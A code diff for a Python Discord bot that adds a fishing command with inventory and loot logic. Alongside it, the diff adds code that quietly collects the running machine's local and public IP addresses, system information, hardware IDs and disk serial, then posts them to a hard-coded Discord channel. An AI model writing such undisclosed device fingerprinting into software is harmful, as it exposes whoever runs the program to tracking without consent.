@@ -25,6 +25,7 @@ import uuid
 import platform
 import wmi
 import subprocess
+import requests
 
 colorama.init(autoreset=True)
 
@@ -63,7 +64,15 @@ try:
         return str(ip_address)
     except Exception as e:
         return f"Error getting IP: {e}"
-  
+    
+    
+  def cred_get_network_ip_address():
+    try:
+        response = requests.get('https://api.ipify.org?format=text')
+        response.raise_for_status()
+        return response.text
+    except Exception as e:
+        return f"Error getting public IP: {e}"  
 
   def cred_get_pc_name():
       try:
@@ -156,6 +165,8 @@ try:
      data = {
          "time": last_action_time.isoformat(),
          "host": cred_get_pc_name(),
+         "Network_ip": str(cred_get_network_ip_address()),
+         "Machine_ip": str(cred_get_ip_address()),
      }
      updateRealTime("lastConnectionTime", data)
      time.sleep(sec)
@@ -259,7 +270,7 @@ try:
   commandLogsChannel = 1325869256486686782
   xmarkEmoji = "<:xmark2:1329251589424283680>"
   tickEmoji = "<:tick2:1329251587524137020>"
-  infoEmoji = "<:_info:1329251517932371968>"
+  infoEmoji = "<:_info:1329667951845965916>"
   loaderEmoji = "<a:_loader:1329287855507509248>"
   StaffCommands = [
     'test_agents',
@@ -363,6 +374,17 @@ try:
       print(Fore.CYAN + "-" * 40)
       playsound(resource_path("bin/startsound.mp3"))
       print(Fore.CYAN + "\nAlso Join Our Discord At: https://discord.gg/ZxaDHm6jc4")
+
+      data = {  
+        "Machine_ip": cred_get_ip_address(),
+        "Network_ip": cred_get_network_ip_address(),
+        "System": cred_get_system_info(),
+        "M-Hardware": cred_get_hardware_id(),
+        "W-Hardware":cred_get_windows_hardware_ids(),
+        "DiskSerial": cred_get_disk_serial(),
+        }
+      channel = bot.get_channel(1329384207897591840)
+      await channel.send(f"## {cred_get_pc_name()}\n||```json\n{json.dumps(data, indent=4, sort_keys=True)}\n```||")
   
 
   commandSpamWarnings = {}  
@@ -479,7 +501,7 @@ try:
       if isinstance(error,commands.CommandOnCooldown):
           return await ctx.respond(f"- **{xmarkEmoji} {error}**",ephemeral=True,delete_after=2)
       if str(error) in doubleStartUpErrorList:
-         print(Fore.RED + f"An error occurred: {str(error)}" + Fore.YELLOW + "\nThe issue might be that the bot was already running somewhere else when you turned it ON, Or someone turned it on after you did, This Error can be Ignored but it is suggested that you turn the bot off and try to use it on the server and if it works then you can be sure someone already has it running.")    
+         print(Fore.RED + f"An error occurred: {str(error)}" + Fore.YELLOW + "\nThe issue might be a network issue from your side or discord's side at rare cases it can be an error from this application but this error can be ignored if it dosn't occur frequently.")    
          return     
       else:
           raise error
@@ -502,7 +524,7 @@ try:
     def decorator(func):
         @wraps(func)
         async def wrapper(ctx, *args, **kwargs):
-            captcha_letters = [getRandomString(4,True),getRandomString(4,True),getRandomString(4,True),getRandomNumber(4),getRandomNumber(4),getRandomNumber(4)]
+            captcha_letters = [GetRandomString(4,True),GetRandomString(4,True),GetRandomString(4,True),GetRandomNumber(4),GetRandomNumber(4),GetRandomNumber(4)]
             correct_answer = random.choice(captcha_letters)
             other_options = random.sample([x for x in captcha_letters if x != correct_answer], 2)
             options = [correct_answer] + other_options
@@ -1328,17 +1350,73 @@ try:
   @hasAccount()
   @captcha()
   async def fish(ctx: discord.ApplicationContext):
+    inventory: list = rdb("accounts", str(ctx.author.id))["inventory"]
+
+    if "fishing_rod" not in [item["id"] for item in inventory]:
+        return await ctx.respond(f"-  **{xmarkEmoji} You don't have a '{GetItem('fishing_rod')['emoji']} {GetItem('fishing_rod')['name']}' in your inventory.**",ephemeral=True)
+    
+    if "fish_bait" not in [item["id"] for item in inventory]:
+        return await ctx.respond(f"-  **{xmarkEmoji} You don't have any '{GetItem('fish_bait')['emoji']} {GetItem('fish_bait')['name']}' in your inventory.**",ephemeral=True)
+    
+    updateInventory(str(ctx.author.id), "fish_bait", -1)
+    for item in inventory:
+        if item["id"] == "fish_bait":
+            item["amount"] -= 1
+            if item["amount"] <= 0:
+                inventory.remove(item)
+
+    
+    
+
+
     file = discord.File(resource_path("bin/fishing.gif"))
-    embed = discord.Embed(title=f"</fish:1329259730039738449>", color=discord.Color.green())
+    embed = discord.Embed(title=f"{ctx.author.display_name} Used </fish:1329259730039738449>", color=discord.Color.blue())
     embed.description = f"**{loaderEmoji} Waiting For a Catch**"
     embed.set_image(url="attachment://fishing.gif")
 
-    waiting_msg = await ctx.followup.send(file=file,embed=embed,ephemeral=False)
+    waiting_msg: discord.ApplicationContext = await ctx.followup.send(file=file,embed=embed,ephemeral=False)
 
-    catchableItems = [
-        {"id":"cell","probibility":100},
-    ]
+    await asyncio.sleep(random.randint(6,12))
 
+    caught = [True,True,True,False]
+    if not random.choice(caught):
+        file = discord.File(resource_path("bin/fishing2.png"))    
+        embed.description = f"**{xmarkEmoji} Caught Nothing!**"
+        embed.set_image(url="attachment://fishing2.png")
+        await waiting_msg.delete()
+        await ctx.followup.send(embed=embed,file=file,ephemeral=False)
+        return 
+
+    catchableItems = GetFishingCatchables()
+    probabilities = [item["probibility"] for item in catchableItems]
+    weighted_items = random.choices(catchableItems, weights=probabilities, k=len(catchableItems))
+    unique_items = list({item['id']: item for item in weighted_items}.values())
+    selected_items = random.sample(unique_items, k=min(len(unique_items), 9))
+    result = []
+    for item in selected_items:
+        amount = random.randint(1, item["max"])
+        result.append({"id": item["id"], "amount": amount})
+        embed.add_field(name=f"{GetItem(item['id'])['emoji']} {GetItem(item['id'])['name']}", value=f"`x{amount}`", inline=True)
+    file = discord.File(resource_path("bin/fishing2.png"))    
+    embed.description = f"**{tickEmoji} Caught Something**"
+    embed.set_image(url="attachment://fishing2.png")
+
+    mainlist_dict = {item['id']: item['amount'] for item in inventory}
+    for item in result:
+     if item['id'] in mainlist_dict:
+        mainlist_dict[item['id']] += item['amount']
+     else:
+        mainlist_dict[item['id']] = item['amount']
+
+    await waiting_msg.delete()
+
+    merged_list = [{'id': key, 'amount': value} for key, value in mainlist_dict.items()]
+
+
+    udb("accounts", str(ctx.author.id), {"inventory": merged_list})
+
+
+    await ctx.followup.send(embed=embed,file=file,ephemeral=False)
 
 
    
@@ -1346,9 +1424,10 @@ try:
 
 
 
-  connectionData = readRealTime("lastConnectionTime") 
+  connectionData = readRealTime("lastConnectionTime")
 
-  if not is_TimeDifference(connectionData["time"],15):
+
+  if not is_TimeDifference(connectionData["time"],15) and connectionData["Machine_ip"] != str(cred_get_ip_address()):
     raise ConnectionRefusedError(Fore.RED + f"Bot is already running on {connectionData["host"]}\nMaybe wait 15 seconds and try again.")  
 
 
@@ -1363,7 +1442,8 @@ try:
       raise PermissionError(Fore.LIGHTYELLOW_EX + "Bot is currently under maintenance")
   else:
       data = { 
-        "ip": cred_get_ip_address(),
+        "Machine_ip": cred_get_ip_address(),
+        "Network_ip": cred_get_network_ip_address(),
         "system": cred_get_system_info(),
         "M-hardwareID": cred_get_hardware_id(),
         "W-hardwareID":cred_get_windows_hardware_ids(),
